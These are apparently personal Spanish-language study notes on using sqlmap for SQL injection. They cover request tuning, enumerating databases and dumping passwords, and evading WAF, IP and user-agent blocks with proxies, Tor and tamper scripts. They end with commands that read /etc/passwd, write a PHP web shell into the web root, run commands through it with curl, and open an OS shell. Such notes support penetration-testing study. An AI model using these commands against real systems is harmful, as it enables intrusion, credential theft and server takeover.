### POST

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

si creemos que uid es vulnerable se le agrega `*` para acortar la superficie de ataque :

```
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```


### HTTP request

si necesitamos pasarle una request muy larga podemos meter toda la request en un archivo de texto y pasarsela como parametro con la flag `-r <archivo.txt>`

### Attack tuning

#### Forzar un campo

si por ejemplo el parámetro inyectable es una cookie : 

```
sqlmap -r Case3.txt -p cookie
```

#### prefijos/sufijos

si queremos que todos los payloads tengan un prefigo o sufijo : 

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

#### level/risk

`--level <1-5>` Prueba más parámetros (por ejemplo, cookies, headers, POST extras)

`--risk <1-3>` - Usa técnicas más lentas o ruidosas. Aumenta posibilidad de detectar vulnerabilidades, pero también de afectar el servidor.

#### Status Codes

--code=200

#### Title

para cuando filtras por la etiqueta `<title>`

`--title`

#### Strings

filtrar resultados segun una palabra
`--string=caca`
#### Text only

pa quitar todas las etiquetas html

`--text-only`

#### UNION

`--union-cols`
`--union-char='a'`

### DB enumeration

#### Basic
`--hostname`
`--current-user`
`--current-db`
`--passwords`
`--banner` -> nos pilla la version de la db
`--is-dba` -> para ver si nuestro user tiene privilegios de admin

#### Tables/Columns

`--tables -D <nombre de la db>` --> las tablas de una db

`--dump -T <nombre de la tabla>` -> como es por dentro una tabla(si se usa sin el -T te tira todas las tablas de la db directamente)

`-c <nombre de la columna>` -> para cuando las tablas tienen muchas columnas y solo quieres unas en especifico

`--start=<num> --stop=<num>` -> para que solo muestre los resultados entre ese rango de numeros (ej:id)

`--where=<condicion>` -> E.j : --where="name LIKE 'f%'"

`--search` -> para que te busque una tabla o columna en especifico
(E.j: --search -T user)

#### Schema 

pa ver como son todas las tablas de la db y que datos guardan etc.

`--schema`

### WAF bypassing

`--csrf-token=<token>` -> bypass csrf tokens

`--randomize=<parametro de la request>` -> para cuando una web usa en vez de anti csrf simplemente un parametro que sea distinto en cada request

`--eval=<cosa>` -> no se muy bien para que es saludos(para valores calculados)

#### IP blacklisting bypass

`--proxy=<proxy url>` -> para cuando una web te blacklistea la IP 

`--proxy-file` -> igual que la anterior pero aqui le pasamos un txt con las proxies que queremos que vaya usando

`--tor` -> proxy de tor

#### User-Agent Blacklisting bypass

error 5XX desde el principio suele ser porque la web bloquea el user agent por defecto de sqlmap : `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`

solucion:
`--random-agent`


#### Tamper

`--tamper=cosa`

cosas:

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

### File Read/Write

```shell-session
--file-read "/etc/passwd"
```

```shell-session
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

para luego poder hacer : 

```shell-session
curl http://www.example.com/shell.php?cmd=ls+-la
```


AUTOMATICO:

```shell-session
--os-shell 
```
